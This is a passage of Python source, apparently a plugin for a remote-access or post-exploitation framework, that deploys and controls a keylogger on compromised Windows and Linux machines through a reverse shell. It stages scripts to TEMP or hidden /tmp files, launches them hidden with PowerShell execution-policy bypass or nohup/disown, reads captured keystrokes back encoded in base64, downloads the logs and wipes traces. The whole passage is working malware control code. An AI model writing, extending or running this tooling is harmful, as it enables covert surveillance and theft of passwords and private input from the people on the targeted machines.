            f"open(sys.argv[2],\"wb\").write(base64.b64decode(open(sys.argv[1]).read()))' "
            f"'{b64_path}' '{remote_path}' 2>/dev/null; then "
            f"rm -f '{b64_path}'; echo DECODE_OK; "
            f"else echo DECODE_FAIL; fi"
        )
        handler.send_to_revshell(sock, decode)
        out = handler.recv_output(sock, timeout=20.0)

    if 'DECODE_OK' not in (out or ''):
        session.print(f"Decode failed on target: {(out or '')[:300]}", 'red')
        return False

    if is_windows:
        size_ps = (
            f"if (Test-Path -LiteralPath '{remote_path}') {{ "
            f"(Get-Item -LiteralPath '{remote_path}').Length }} else {{ 0 }}"
        )
        size_out = _run_ps(session, size_ps, timeout=8.0)
    else:
        handler.send_to_revshell(
            sock,
            f"if [ -f '{remote_path}' ]; then wc -c < '{remote_path}'; "
            f"else echo 0; fi",
        )
        size_out = handler.recv_output(sock, timeout=8.0)

    size = _parse_int(size_out)
    if size != len(content_bytes):
        session.print(
            f"Size mismatch after staging: {size} vs {len(content_bytes)} bytes.",
            'red',
        )
        return False

    return True


# ---------------------------------------------------------------------------
# Windows backend
# ---------------------------------------------------------------------------

def _windows_start(session: SessionContext, token: str) -> int:
    temp_dir = _resolve_windows_temp(session)
    if not temp_dir:
        session.print("Could not resolve target TEMP directory.", 'red')
        return 1

    script_remote = temp_dir + "\\" + token + ".ps1"
    log_remote = temp_dir + "\\" + token + ".dat"
    stop_remote = temp_dir + "\\" + token + ".stop"
    err_remote = temp_dir + "\\" + token + ".err"

    body = _WINDOWS_SOURCE.replace('\r\n', '\n').replace('\n', '\r\n')
    data = body.encode('utf-8')

    session.print(
        f"Staging {len(data)} bytes to {script_remote} "
        f"(this may take a moment)...",
        'yellow',
    )

    if not _stage_via_lines(session, script_remote, data, is_windows=True):
        return 1

    launch = (
        "$ErrorActionPreference='SilentlyContinue';"
        f"Remove-Item -LiteralPath '{err_remote}' -Force -EA 0;"
        "$argList = @('-NoProfile','-ExecutionPolicy','Bypass','-File',"
        f"'{script_remote}','-Token','{token}');"
        "$p = Start-Process -FilePath 'powershell.exe' -ArgumentList $argList "
        "-WindowStyle Hidden -PassThru "
        f"-RedirectStandardError '{err_remote}' "
        "-ErrorAction SilentlyContinue;"
        "if ($p) { Write-Output ('PID:' + $p.Id) } else { Write-Output 'PID:0' }"
    )
    out = _run_ps(session, launch, timeout=20.0)
    pid = None
    for line in (out or '').splitlines():
        s = line.strip()
        if s.startswith('PID:'):
            try:
                pid = int(s.split(':', 1)[1])
            except Exception:
                pass
            break

    if not pid or pid <= 0:
        session.print(f"Launch failed — output: {(out or '')[:400]}", 'red')
        return 1

    time.sleep(3.0)
    alive = (
        _run_ps(
            session,
            f"if (Get-Process -Id {pid} -EA 0) {{ 'ALIVE' }} else {{ 'DEAD' }}",
            timeout=8.0,
        ) or ''
    ).strip()
    if 'DEAD' in alive:
        err_out = _run_ps(
            session,
            f"if (Test-Path -LiteralPath '{err_remote}') {{ "
            f"Get-Content -Raw -LiteralPath '{err_remote}' -EA 0 }} else {{ '' }}",
            timeout=10.0,
        )
        log_out = _run_ps(
            session,
            f"if (Test-Path -LiteralPath '{log_remote}') {{ "
            f"Get-Content -Raw -LiteralPath '{log_remote}' -EA 0 }} else {{ '' }}",
            timeout=10.0,
        )
        session.print(f"Process {pid} exited within 3 seconds.", 'red')
        session.print(f"--- child stderr ---\n{(err_out or '(empty)')[:800]}", 'yellow')
        session.print(f"--- log content ---\n{(log_out or '(empty)')[:800]}", 'yellow')
        _run_ps(
            session,
            f"Remove-Item -LiteralPath '{script_remote}','{err_remote}' -Force -EA 0",
            timeout=8.0,
        )
        return 1

    state = {
        'platform': 'windows',
        'token': token,
        'pid': pid,
        'script_path': script_remote,
        'log_path': log_remote,
        'stop_path': stop_remote,
        'err_path': err_remote,
        'started_at': datetime.datetime.now().isoformat(timespec='seconds'),
    }
    _save_state(session, state)
    session.log_event(f"keylogger: started on windows (token={token} pid={pid})")
    session.print(f"Keylogger running on Windows (PID {pid}). Log: {log_remote}", 'green')
    session.print("Use 'run keylogger status' to view keystrokes, 'stop' to terminate.", 'yellow')
    return 0


def _windows_status(session: SessionContext, state: dict) -> int:
    pid = state['pid']
    log_path = state.get('log_path', '')

    check_ps = f"if (Get-Process -Id {pid} -EA 0) {{ 'RUNNING' }} else {{ 'STOPPED' }}"
    proc_state = (_run_ps(session, check_ps, timeout=10.0) or '').strip() or 'UNKNOWN'

    from ...constants import XFER_MARK_START, XFER_MARK_END
    read_ps = (
        "$ErrorActionPreference='SilentlyContinue';"
        f"$content = Get-Content -Raw -LiteralPath '{log_path}' -EA 0;"
        "if ($content) {"
        "  $b = [Text.Encoding]::UTF8.GetBytes($content);"
        f"  Write-Output ('{XFER_MARK_START}' + [Convert]::ToBase64String($b) + '{XFER_MARK_END}')"
        "} else {"
        f"  Write-Output ('{XFER_MARK_START}{XFER_MARK_END}')"
        "}"
    )
    raw = _run_ps(session, read_ps, timeout=20.0)
    content = ''
    if raw:
        start = raw.find(XFER_MARK_START)
        if start >= 0:
            start += len(XFER_MARK_START)
            end = raw.find(XFER_MARK_END, start)
            if end >= 0:
                b64 = raw[start:end].strip()
                if b64:
                    try:
                        content = base64.b64decode(b64).decode('utf-8', errors='replace')
                    except Exception:
                        content = ''

    size_ps = (
        f"if (Test-Path -LiteralPath '{log_path}') {{ "
        f"(Get-Item -LiteralPath '{log_path}').Length }} else {{ 0 }}"
    )
    size_raw = _run_ps(session, size_ps, timeout=10.0)
    log_size = _parse_int(size_raw)

    _render_status(session, state, proc_state, log_size, content)
    return 0


def _windows_stop(session: SessionContext, state: dict, keep_log: bool) -> int:
    pid = state.get('pid')
    script_path = state.get('script_path', '')
    log_path = state.get('log_path', '')
    err_path = state.get('err_path', '')

    _run_ps(session, f"Stop-Process -Id {pid} -Force -EA 0; 'DONE'", timeout=15.0)

    cleanup = []
    if script_path:
        cleanup.append(f"Remove-Item -LiteralPath '{script_path}' -Force -EA 0")
    if err_path:
        cleanup.append(f"Remove-Item -LiteralPath '{err_path}' -Force -EA 0")
    if not keep_log and log_path:
        cleanup.append(f"Remove-Item -LiteralPath '{log_path}' -Force -EA 0")
    if cleanup:
        _run_ps(session, '; '.join(cleanup) + "; 'OK'", timeout=15.0)

    _finish_stop(session, state, keep_log)
    return 0


# ---------------------------------------------------------------------------
# Linux backend
# ---------------------------------------------------------------------------

def _unix_remote_paths(token: str) -> tuple:
    base = '/tmp'
    return (
        f"{base}/.{token}.py",
        f"{base}/.{token}.dat",
        f"{base}/.{token}.stop",
    )


def _unix_start(session: SessionContext, token: str) -> int:
    script_remote, log_remote, stop_remote = _unix_remote_paths(token)

    data = _LINUX_SOURCE.encode('utf-8')
    session.print(f"Staging {len(data)} bytes to {script_remote}...", 'yellow')

    if not _stage_via_lines(session, script_remote, data, is_windows=False):
        return 1

    launch = (
        f"PY=$(command -v python3 2>/dev/null || command -v python 2>/dev/null); "
        f"if [ -z \"$PY\" ]; then echo NO_PYTHON; exit 1; fi; "
        f"chmod +x '{script_remote}' 2>/dev/null; "
        f"nohup \"$PY\" '{script_remote}' '{log_remote}' '{stop_remote}' "
        f"</dev/null >/dev/null 2>&1 & "
        f"KID=$!; "
        f"disown $KID 2>/dev/null; "
        f"echo PID:$KID"
    )
    out = _run_shell(session, launch, timeout=15.0)
    pid = None
    for line in (out or '').splitlines():
        s = line.strip()
        if s.startswith('PID:'):
            try:
                pid = int(s.split(':', 1)[1])
            except Exception:
                pass
            break

    if not pid:
        if 'NO_PYTHON' in (out or ''):
            session.print("Python is not installed on the target.", 'red')
            return 1
        session.print(f"Launch failed — output: {(out or '')[:400]}", 'red')
        return 1

    time.sleep(3.0)
    MARK_S = '__KLLIVE_S__'
    MARK_E = '__KLLIVE_E__'
    check_cmd = (
        f"printf '%s' '{MARK_S}'; "
        f"if pgrep -f '{script_remote}' >/dev/null 2>&1; then printf 'ALIVE'; "
        f"elif kill -0 {pid} 2>/dev/null; then printf 'ALIVE'; "
        f"else printf 'DEAD'; fi; "
        f"printf '%s' '{MARK_E}'"
    )
    raw = _run_shell(session, check_cmd, timeout=8.0) or ''
    proc_state = ''
    start = raw.rfind(MARK_S)
    if start >= 0:
        start += len(MARK_S)
        end = raw.find(MARK_E, start)
        if end >= 0:
            proc_state = raw[start:end].strip()

    if proc_state != 'ALIVE':
        log_tail = _run_shell(
            session,
            f"if [ -f '{log_remote}' ]; then tail -30 '{log_remote}'; "
            f"else echo '(no log file)'; fi",
            timeout=8.0,
        )
        session.print(f"Process exited within 3 seconds.", 'red')
        session.print(f"--- log tail ---\n{(log_tail or '(empty)')[:800]}", 'yellow')
        _run_shell(
            session,
            f"rm -f '{script_remote}' '{stop_remote}'",
            timeout=8.0,
        )
        return 1

    state = {
        'platform': 'unix',
        'token': token,
        'pid': pid,
        'script_path': script_remote,
        'log_path': log_remote,
        'stop_path': stop_remote,
        'started_at': datetime.datetime.now().isoformat(timespec='seconds'),
    }
    _save_state(session, state)
    session.log_event(f"keylogger: started on unix (token={token} pid={pid})")
    session.print(f"Keylogger running on Linux/Unix (PID {pid}). Log: {log_remote}", 'green')
    session.print("Use 'run keylogger status' to view keystrokes, 'stop' to terminate.", 'yellow')
    return 0


def _unix_status(session: SessionContext, state: dict) -> int:
    pid = state.get('pid')
    log_path = state.get('log_path')
    script_path = state.get('script_path', '')

    MARK_S = '__KLSTAT_S__'
    MARK_E = '__KLSTAT_E__'
    check = (
        f"printf '%s' '{MARK_S}'; "
        f"if pgrep -f '{script_path}' >/dev/null 2>&1; then printf 'RUNNING'; "
        f"elif kill -0 {pid} 2>/dev/null; then printf 'RUNNING'; "
        f"else printf 'STOPPED'; fi; "
        f"printf '%s' '{MARK_E}'"
    )
    out = _run_shell(session, check, timeout=8.0) or ''
    proc_state = 'UNKNOWN'
    start = out.rfind(MARK_S)
    if start >= 0:
        start += len(MARK_S)
        end = out.find(MARK_E, start)
        if end >= 0:
            proc_state = out[start:end].strip() or 'UNKNOWN'

    read_cmd = (
        f"if [ -f '{log_path}' ]; then "
        f"base64 -w0 '{log_path}' 2>/dev/null || base64 '{log_path}' 2>/dev/null; fi"
    )
    raw = _run_shell(session, read_cmd, timeout=20.0)
    content = _decode_b64(raw)

    size_cmd = f"if [ -f '{log_path}' ]; then wc -c < '{log_path}'; else echo 0; fi"
    size_raw = _run_shell(session, size_cmd, timeout=8.0)
    log_size = _parse_int(size_raw)

    _render_status(session, state, proc_state, log_size, content)
    return 0


def _unix_stop(session: SessionContext, state: dict, keep_log: bool) -> int:
    pid = state.get('pid')
    script_path = state.get('script_path')
    stop_path = state.get('stop_path')
    log_path = state.get('log_path')

    cmds = []
    if stop_path:
        cmds.append(f"touch '{stop_path}' 2>/dev/null")
    cmds.append(f"kill -TERM {pid} 2>/dev/null")
    cmds.append(f"pkill -f '{script_path}' 2>/dev/null")
    cmds.append(f"sleep 1; kill -9 {pid} 2>/dev/null")
    cmds.append(f"pkill -9 -f '{script_path}' 2>/dev/null")
    if script_path:
        cmds.append(f"rm -f '{script_path}'")
    if stop_path:
        cmds.append(f"rm -f '{stop_path}'")
    if not keep_log and log_path:
        cmds.append(f"rm -f '{log_path}'")
    cmds.append("echo OK")
    _run_shell(session, '; '.join(cmds), timeout=15.0)

    _finish_stop(session, state, keep_log)
    return 0


# ---------------------------------------------------------------------------
# Shared render / stop helpers
# ---------------------------------------------------------------------------

def _render_status(session: SessionContext, state: dict, proc_state: str,
                   log_size: int, content: str) -> None:
    c = session.colors
    state_color = c['green'] if proc_state == 'RUNNING' else c['red']
    session.print("")
    session.print(f"{c['cyan']}KEYLOGGER STATUS — session #{session.session_id}{c['end']}")
    session.print("-" * 60)
    session.print(f"  Platform:  {state.get('platform', '?')}")
    session.print(f"  State:     {state_color}{proc_state}{c['end']}")
    session.print(f"  PID:       {state.get('pid', '?')}")
    session.print(f"  Started:   {state.get('started_at', '?')}")
    session.print(f"  Log path:  {state.get('log_path', '?')}")
    session.print(f"  Log size:  {log_size} bytes")
    session.print("")
    session.print(f"{c['cyan']}CAPTURED KEYSTROKES{c['end']}")
    session.print("-" * 60)
    if not content:
        session.print("  (empty — nothing captured yet)", 'yellow')
    else:
        if len(content) > 8000:
            session.print(f"  (showing last 8000 of {len(content)} chars)")
            session.print(content[-8000:])
        else:
            session.print(content)
    session.log_event(
        f"keylogger: status checked (state={proc_state} size={log_size})"
    )


def _finish_stop(session: SessionContext, state: dict, keep_log: bool) -> None:
    session.log_event(
        f"keylogger: stopped (token={state.get('token')} "
        f"pid={state.get('pid')} keep_log={keep_log})"
    )
    if keep_log:
        session.print(
            f"Keylogger stopped. Log preserved at {state.get('log_path')}. "
            f"Use 'run keylogger fetch <local>' to download it.",
            'green',
        )
        state['stopped_at'] = datetime.datetime.now().isoformat(timespec='seconds')
        _save_state(session, state)
    else:
        session.print("Keylogger stopped and artifacts removed.", 'green')
        _clear_state(session)


# ---------------------------------------------------------------------------
# Commands
# ---------------------------------------------------------------------------

def _cmd_start(session: SessionContext) -> int:
    existing = _load_state(session)
    if existing.get('token'):
        session.print(
            f"A keylogger is already running on this session "
            f"(token {existing['token']}, platform {existing.get('platform', '?')}). "
            f"Run 'status' or 'stop' first.",
            'yellow',
        )
        return 1

    platform = session.platform
    if platform == 'windows':
        return _windows_start(session, secrets.token_hex(4))
    if platform in ('unix', 'linux'):
        return _unix_start(session, secrets.token_hex(4))

    session.print(f"Unsupported platform: {platform}", 'red')
    return 1


def _cmd_status(session: SessionContext) -> int:
    state = _load_state(session)
    if not state.get('token'):
        session.print("No keylogger is registered for this session.", 'yellow')
        return 0
    if state.get('platform') == 'windows':
        return _windows_status(session, state)
    return _unix_status(session, state)


def _cmd_stop(session: SessionContext, args: List[str]) -> int:
    state = _load_state(session)
    if not state.get('token'):
        session.print("No keylogger is registered for this session.", 'yellow')
        return 0
    keep_log = '--keep-log' in args
    if state.get('platform') == 'windows':
        return _windows_stop(session, state, keep_log)
    return _unix_stop(session, state, keep_log)


def _cmd_fetch(session: SessionContext, args: List[str]) -> int:
    state = _load_state(session)
    if not state.get('log_path'):
        session.print("No log path registered. Start a keylogger first.", 'yellow')
        return 1
    if not args:
        session.print("Usage: run keylogger fetch <local_path>", 'yellow')
        return 1

    local_path = args[0]
    try:
        ok = session.download(state['log_path'], local_path)
    except Exception as exc:
        session.print(f"Download failed: {exc}", 'red')
        return 1

    if ok:
        session.print(f"Log downloaded to {local_path}", 'green')
        return 0
    session.print("Download failed.", 'red')
    return 1


@plugin.command(
    name='keylogger',
    platforms=['linux', 'windows', 'unix'],
    description='Cross-platform keystroke capture with window context: start, status, stop, fetch',
)
def run(session: SessionContext, args: List[str]):
    if not args:
        session.print(_USAGE)
        return 0
    sub = args[0].lower()
    if sub in ('-h', '--help', 'help'):
        session.print(_USAGE)
        return 0
    if sub == 'start':
        return _cmd_start(session)
    if sub == 'status':
        return _cmd_status(session)
    if sub == 'stop':
        return _cmd_stop(session, args[1:])
    if sub == 'fetch':
        return _cmd_fetch(session, args[1:])
    session.print(_USAGE)
    return 0